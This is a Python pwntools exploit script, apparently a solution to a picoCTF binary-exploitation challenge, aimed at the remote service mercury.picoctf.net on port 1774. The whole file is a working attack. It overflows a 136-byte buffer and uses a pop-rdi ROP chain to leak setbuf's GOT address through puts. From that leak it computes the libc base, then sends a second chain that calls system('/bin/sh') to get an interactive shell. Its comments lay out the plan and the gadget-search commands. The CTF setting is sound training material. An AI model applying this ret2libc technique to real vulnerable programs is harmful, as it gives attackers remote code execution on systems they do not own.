from pwn import *




# p = process("./vuln")

offset = 136
buf = b"A"* offset
# gdb.attach(p)

p=remote("mercury.picoctf.net", 1774)

'''
Plan of attack

* Use puts/printf to leak an address
* We need to supply arguments to puts
* we will use Rop to do this
* we need the x64 calling convenctions i.e rdi is the first argment

ROPgadget --binary ./vuln | grep rdi
0x0000000000400913 : pop rdi ; ret

* After Leak of Scanf we can calculate offset b/w scanf and lIBC

'''


pop_rdi = 0x400913
# scanf from got.plt
scanf_at_got = 0x601038  # Not a good options to leak so moving to puts@plt
puts_at_got = 0x601018  # Not a good options to leak so moving
setbuf_got = 0x601028
puts_at_plt = 0x400540
# jump back to safe place(main itself)
back_to_main = 0x400771

#############

payload =[
    buf, p64(pop_rdi), p64(setbuf_got), p64(puts_at_plt), p64(back_to_main)
]


payload = b"".join(payload)

p.sendline(payload)

p.recvline()
p.recvline()
leak = u64(p.recvline().strip().ljust(8,b"\x00"))

log.info(f"{hex(leak)=}")

""" To find LIBC address
Command => readelf -s ./libc.so.6 | grep scanf

2062: 000000000007b0b0   197 FUNC    GLOBAL DEFAULT   13 scanf@@GLIBC_2.2.5
1403: 000000000004f4e0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5

422: 0000000000080a30   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5

2185: 0000000000088540    10 FUNC    GLOBAL DEFAULT   13 setbuf@@GLIBC_2.2.5
"""
base_addr_scanf = 0x7b0b0
base_addr_puts = 0x80a30

base_addr_setbuf = 0x88540
base_addr_system = 0x4f4e0
# base_addr_libc = leak - base_addr_scanf

base_addr_libc = leak - base_addr_setbuf

actual_addr_sys = base_addr_libc + base_addr_system
base_addr_bin_sh = 0x1b40fa
actual_addr_bin_sh = base_addr_libc + base_addr_bin_sh

log.info(f"{hex(base_addr_libc)=}")
ret_instruction = 0x40052e  # ROPgadget --binary ./vuln | grep ": ret"

second_payload = [
    buf, p64(pop_rdi), p64(actual_addr_bin_sh),p64(ret_instruction) ,p64(actual_addr_sys)
]


second_payload = b"".join(second_payload)
p.sendline(second_payload)

p.interactive()


